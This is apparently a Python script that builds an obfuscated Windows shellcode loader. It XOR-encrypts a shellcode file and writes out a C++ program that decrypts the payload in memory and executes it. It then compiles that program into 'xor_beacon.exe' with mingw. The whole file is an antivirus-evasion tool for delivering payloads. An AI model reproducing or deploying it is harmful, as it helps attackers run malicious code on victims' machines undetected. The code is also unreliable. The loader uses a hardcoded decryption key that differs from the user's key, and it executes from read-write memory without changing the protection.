#!/usr/bin/python

import sys, os

def xor(data, key):
	
	key = str(key)
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str

def getbytes(ciphertext):
	return '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'

if len(sys.argv) == 3:
	try:
		bin_file = sys.argv[1]
		plaintext = open(bin_file, "rb").read()
		print('[*] Using: ' + bin_file)
	except:
	    print('shellcode-builder.py <bin file> <key>')
	    quit()
	key = sys.argv[2]
	print('[*] Key: ' + key)
else:
	print('shellcode-builder.py <bin file> <key>')
	quit()

if __name__ == "__main__":
	out_file_c = 'xor_beacon.c'
	out_file_exe = 'xor_beacon.exe'
	compiler = 'i686-w64-mingw32-g++'

	ciphertext = xor(plaintext, key)
	shellcode = getbytes(ciphertext)

	cpp = '''
	#include <windows.h>

	void XOR(char* data, size_t data_len, char* key, size_t key_len) {
		int j;

		j = 0;
		for (int i = 0; i < data_len; i++) {
			if (j == key_len - 1) j = 0;

			data[i] = data[i] ^ key[j];
			j++;
		}
	}

	int main(void) {

		void* hAl;
		BOOL didUpdate;
		HANDLE hThread;
		DWORD oldprotect = 0;

		unsigned char squirtle[] = %s;
		unsigned int squirtles_size = sizeof(squirtle);
		char key[] = "PokemonAreStillCool?";

		void *exec = VirtualAlloc(0, squirtles_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		XOR((char*)squirtle, squirtles_size, key, sizeof(key));

		memcpy(exec, squirtle, squirtles_size);
		((void(*)())exec)();

		return 0;
	}

	''' % shellcode

	if os.system('which %s  > /dev/null 2>&1' % compiler) != 0: print('[-] %s not installed!' % compiler)

	with open(out_file_c,'w') as f:
		f.write((cpp))

	if os.path.exists(out_file_c):
		print('[*] Compiling...')
		os.system('i686-w64-mingw32-g++ %s -o %s' % (out_file_c, out_file_exe))

	if os.path.exists(out_file_exe):
		print('[+] Compiled: ' + out_file_exe)
